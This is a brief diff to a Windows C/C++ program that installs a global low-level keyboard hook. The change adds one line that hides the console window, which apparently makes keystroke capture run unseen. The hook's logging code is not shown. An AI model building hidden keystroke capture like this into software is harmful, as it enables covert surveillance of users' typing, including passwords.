@@ -30,6 +30,7 @@ LRESULT CALLBACK LLKeyProc(int nCode, WPARAM wParam, LPARAM lParam)
  
 int main()
 {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKeyProc, GetModuleHandle(NULL), 0);
     if(hook)
     {
